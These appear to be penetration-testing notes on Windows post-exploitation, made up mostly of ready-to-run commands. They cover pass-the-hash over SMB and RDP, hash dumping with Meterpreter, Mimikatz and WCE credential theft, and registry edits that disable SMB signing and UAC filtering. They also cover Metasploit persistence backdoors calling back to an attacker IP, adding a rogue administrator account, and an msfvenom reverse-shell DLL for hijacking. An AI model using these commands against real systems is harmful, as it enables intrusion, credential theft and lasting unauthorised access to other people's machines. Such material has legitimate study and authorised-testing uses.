## password hash
### Pass-the-Hash Attack 



**Prerequisites for Pass-the-Hash Attack**
To successfully perform a Pass-the-Hash (PtH) attack and maintain access using SMB, you must ensure the following:

1. **Obtain the Hash**: 
   - The attacker must have the NTLM hash of a valid user. This user must have administrative privileges or belong to the Administrators group on the target system.
   
2. **Administrator Privileges**:
   - The user whose hash is obtained needs to be part of the local administrators or domain admin group on the target machine for privileged access.

3. **Open Services (like SMB)**:
   - The target system must have SMB (port 445) open to facilitate the connection. Other services could be checked for vulnerabilities, but for this example, we focus on SMB.
#### pass the hash attack over smb

 **Steps to Scan the Target**
Before performing the Pass-the-Hash attack, you should scan the target for open services. Here’s an example using `nmap`:

```bash
nmap  <target-ip>
```

This will check if SMB is open on the target. If SMB is available, you can proceed with the attack.

**get the admin hash**
> need to be system user , but it can also work on administrator user with  some windows versions

```bash
#using metasploit meterpreter 
meterpreter> run hashdump  
```
- `hashdump (hashdump)`  is a basic, direct method for dumping hashes.
- **`smart_hashdump (run hashdump)`** is a more sophisticated and adaptive module that tries to use the most


**Pass-the-Hash Attack on SMB**

Assuming you have the NTLM hash for a user with administrative rights, you can use the `impacket` suite for the Pass-the-Hash attack. Here’s an example:

```bash
# using metasploit
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser <username>
set SMBPass <ntlm_hash>
set SMBPass NT <NTLM_hash> (if only the NTLM hash is used)
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
run

```



 **Correct Handling of Access Denied (Command=117)***
 
>When trying to use Pass-the-Hash for SMB using user in administrator group and encountering access issues with the error message similar to **"command=117"**, this is typically related to SMB security settings that require a certain level of signing or prevent privileged access over the network.

 **Solution: Modifying the Required Registry Settings**

To resolve this, you need to modify two key registry values to allow the administrative hash to work properly over SMB and avoid issues like **Access Denied**.

1. **Registry Key 1: `LocalAccountTokenFilterPolicy`**

   This key allows local administrative users to authenticate over the network without User Account Control (UAC) interference.

   **PowerShell Command:**
   ```powershell
   New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType DWord -Force
   ```

2. **Registry Key 2: `RequireSecuritySignature`**

   This setting forces SMB to use message signing, which can prevent certain operations, like Pass-the-Hash attacks, if enabled. Disabling it can help overcome the "Access Denied" issue.

   You need to create a new `DWORD (32-bit)` value named `RequireSecuritySignature` and set it to `0` under the `LanmanServer` settings.

   **PowerShell Command:**
   ```powershell
   New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0 -PropertyType DWord -Force
   ```

#### pass the hash attack over RDP 
```bash
xfreerdp /u:admin /d:foocorp /pth:<NTLM_HASH> /v:172.16.2.119
```
>uses the NTLM hash to authenticate the user over RDP (Remote Desktop Protocol) without needing the clear-text password.

### cracking the hash

- After dumping hashes, attempt to crack them to retrieve passwords for active services.
- Password cracking isn't covered in this section, but will be discussed in-depth in the **System Security** section. `john --format=NT hashes.txt`

---

### Using Mimikatz to Gather Credentials 

- **Ensure 64-bit process for Mimikatz**: For Mimikatz to work fully, it must run in a 64-bit process. Verify your current Meterpreter session’s architecture with the command:

  ```
  meterpreter > sysinfo
  ```

  If running on a 32-bit process, migrate to a 64-bit process with the same privileges (e.g., SYSTEM).

- **Migrating to a 64-bit process**:
  1. List processes with SYSTEM privileges and filter by architecture using:

     ```
     meterpreter > ps -A x86_64 -s
     ```

     `-A`: Specifies the architecture (e.g., x64)
     `-s`: Filters for SYSTEM processes

     Example of output:
     ```
     PID   Name        Arch   User
     280   smss.exe    x64    NT AUTHORITY\SYSTEM
     308   svchost.exe x64    NT AUTHORITY\SYSTEM
     ```

  2. Identify a 64-bit process (e.g., `smss.exe`, `svchost.exe`) and migrate to it by using:

     ```
     meterpreter > migrate [PID]
     ```

     Example:
     ```
     meterpreter > migrate 448
     ```

  3. Verify the migration by checking the user and system info:

     ```
     meterpreter > getuid
     meterpreter > sysinfo
     ```
4. 
- Run `load mimikatz` and use `help` to list available commands.
- Mimikatz allows credential retrieval from various services and protocols.
- **Retrieving credentials with wdigest**:
  1. To extract credentials from the system, use the `wdigest` command:

     ```
     meterpreter > wdigest
     ```

  * The output will display credentials such as the AuthID, NTLM hashes, and users.
 
  - **Mimikatz Usage**: 
  - Mimikatz offers various modules like `crypto`, `hash`, `system`, `privilege`, and more. Explore the commands and modules for further tasks, such as credential extraction and privilege manipulation.

For more detailed exploration, refer to the [Mimikatz wiki](https://github.com/gentilkiwi/mimikatz/wiki).

- **Using WCE (Windows Credentials Editor)**:
  Another very useful tool that can be used in this step is WCE (Windows Credentials Editor). Since it is a Windows binary, you will have to upload it to the remote machine and then run it from the Meterpreter session.

  1. Upload WCE to the remote machine.
  2. Execute WCE from the Meterpreter session using the following command:

     ```
     meterpreter > execute -f wce.exe -a -h
     ```
     Example output:
     ```
     Process 3628 created
     Channel 4 created
     WCE v1.42beta (X64) (Windows Credentials Editor) (c) 2010-2013 Amplia Security by Hernan Och
     ```
  3. Common options for WCE include:
     - `-l`: List logon sessions and NTLM credentials (default)
     - `-s`: Lists logon sessions and NTLM credentials indefinitely, refreshing every 5 seconds
     - `-c`: Run a specified command in a new session with NTLM credentials

  For more details, refer to the [WCE documentation](https://www.ampliasecurity.com/research/windows-credentials-editor/).




### Enabling the Stopped or Not Running Services 

Opening a Windows Command Prompt from a Meterpreter Shell

`  meterpreter > shell`
  
  ``` <cmd example here>
  net start
  ```
  Displays a list of all running services.

Checking Specific Services with WMIC
- Command:
  ``` <cmd example here>
  wmic service where 'Caption like "Remote%" and started=true' get Caption
  ```
  This command checks if specific services (e.g., services with "Remote" in their name) are enabled and running using WMIC.

Checking Services with Meterpreter Scripts
- Listing Services with `service_manager`:
  ``` <cmd example here>
  run service_manager -l
  ```

- Using `enum_services`:
  ``` <cmd example here>
  run post/windows/gather/enum_services
  ```

Enabling Remote Desktop (RDP)
- Using Meterpreter `getgui` Script:
  ``` <cmd example here>
  meterpreter > run getgui -e
  ```
  - Options:
    - `-e`: Enable RDP.
    - `-u <username>`: Add a user.
    - `-p <password>`: Add a password.

  This command enables RDP and can also add a user and password.

Adding a User to Remote Desktop Users Group
- Command:
  ``` <cmd example here>
  net localgroup "Remote Desktop Users" <username> /add
  ```
  Adds `<username>` to the "Remote Desktop Users" group, allowing them to connect via RDP.

Checking the Firewall for RDP
Ensure that the Windows firewall allows RDP connections after enabling the service.

Establishing an RDP Connection
- Command:
  ``` <cmd example here>
  rdesktop [IP_ADDRESS] –u [USERNAME] –p [PASSWORD]
  ```
  Use this to establish a Remote Desktop session with the target machine.

Listing Groups with `net localgroup`
- Command:
  ``` <cmd example here>
  net localgroup
  ```
  Lists all groups on the system.

Listing Users within a Group
- Command:
  ``` <cmd example here>
  net localgroup "Remote Desktop Users"
  ```
  Lists users in the "Remote Desktop Users" group.

Adding a User to the Administrators Group
- Command:
  ``` <cmd example here>
  net localgroup Administrators <username> /add
  ```
  Grants a standard user administrator privileges.

Enabling Telnet for Remote Access
- Ensure the **Telnet service** is enabled and the user is in the **TelnetClients** group.
- Command:
  ``` <cmd example here>
  net localgroup TelnetClients <username> /add
  ```

This allows for remote shell access via Telnet, using the same credentials.


## Backdoor

The disadvantage of using a backdoor is that it will always attempt a connection to the same IP address and port unless you use a host name obtained through some free DNS service like:
- http://freedns.afraid.org/
- http://www.zoneedit.com/dynamicDNS.html
- http://xname.org/

Note: This is a common technique used by malware. It ensures that you can change the DNS binding to point to your IP address using the DNS management panel.

**Exploitation Process**

1. Upload the backdoor to the victim.
2. Execute the file:
   - It will attempt to connect back to our listener at predefined intervals (e.g., every 5-6-10 seconds).
3. Run it automatically at boot:
   - This can be done by editing the Windows registry, services, task scheduler, `rc.local`, or `init.d`, depending on the operating system.

**Automating with Metasploit**

Metasploit can automate the entire process. You don’t need to worry about scripting the file, uploading it, or editing the registry and services manually. Once you have a Meterpreter session, you can run a script to automate the process. The script is designed for Windows machines.

**Running the Persistence Script**

From a Meterpreter session, you can view the options for the persistence script using:
```
run persistence -h
```
The script allows customization such as choosing where to upload the file, which payload to use, the connection interval, how to start the backdoor, and more.

**Example of Configuring Persistence**

Here are the options used to configure the persistence script:
- `-A` starts the handler on our machine.
- `-X` starts the agent at boot. (Requires SYSTEM privileges.)
- `-i 5` sets the connection attempt interval to every 5 seconds.
- `-p 8080` specifies the port for the reverse connection.
- `-r [IP_Address]` specifies our IP address.

**Running the Script**

After executing the script, it will:
- Automatically create the backdoor.
- Upload the backdoor file.
- Set the registry keys to ensure the backdoor starts at boot.

Example command:
```
run persistence -A -X -i 5 -p 8080 -r <attacker-ip>
```

**Detailed Steps**

1. **Creating the Payload:** 
   - `windows/meterpreter/reverse_tcp`
   - `LHOST=192.168.102.147 LPORT=8080`
   
2. **Persistent Script:** 
   - Written to `C:\Windows\TEMP\flKiuvjYDY.vbs`
   
3. **Executing the Script:** 
   - Upload the backdoor file.
   - Run the backdoor.
   - Install it into autorun via the Windows Registry key:
     - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\nZVDeQbFvEi`

**Verifying Changes**

Use the `reg` command to check the registry value and confirm the backdoor is installed:
```
meterpreter> reg queryval -k HKLM\Software\Microsoft\Windows\CurrentVersion\Run -v nZVDeQbFvEi
```

**Starting a Session**

To get a session on the target machine, start a listener and wait for incoming connections using the `exploit/multi/handler` module. Ensure that the same options (payload, IP address, and port) match those used with persistence.

Each time the target machine reboots, you can establish a session since the script runs at boot.

**Creating Your Own Backdoor**

If you create your own backdoor using `msfvenom`, Veil, or The Backdoor Factory, you can follow these steps:

1. Upload the backdoor file to the victim machine:
   ```
   upload /root/my_bd.exe C:\\Windows\
   ```
   
2. Edit the Windows Registry to run the backdoor at startup:
   ```
   reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -d "C:\Windows\my_bd.exe" -v bd_name
   ```

For tools like Veil and The Backdoor Factory:
- https://github.com/Veil-Framework/
- https://github.com/secretsquirrel/the-backdoor-factory

##  New User

1. **Create a New User:**
   ```
   net user attacker Password123 /add
   ```

2. **Add User to Administrator Group (for RDP, etc.):**
   ```
   net localgroup administrators attacker /add
   ```

3. **Enable RDP Access (if needed):**
   ```
   net localgroup "Remote Desktop Users" attacker /add
   # or 
   netsh advfirewall set rule group="remote desktop" new enable=yes
   ```

4. **For Telnet Access (if Telnet is enabled on the system):**
   ```
   net localgroup TelnetClients attacker /add
   ```

These commands ensure the new user has administrative privileges and access to important services.


## DLL Hijacking
**Identifying and Exploiting DLL Hijacking with Process Monitor**

1. **Set Procmon Filters:**
   - Launch **Process Monitor** and create a filter for the target executable (e.g., `RegSrvc.exe`).
   - Add a filter for the **Result** column to capture entries with "NAME NOT FOUND," highlighting DLLs the system couldn’t find.

2. **Find Writable Directories:**
   - Look for instances where the executable is trying to load a DLL from directories where you have write permissions.

3. **Inject Malicious DLL:**
   - Create a malicious DLL payload and place it in the identified writable directory.
   `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll > malicious.dll
`
1. **Trigger the DLL Load:**
   - Restart the service, relaunch the application, or wait for a system reboot if the executable starts with the system.
   - You can also wait for the user to launch the affected application.
   - 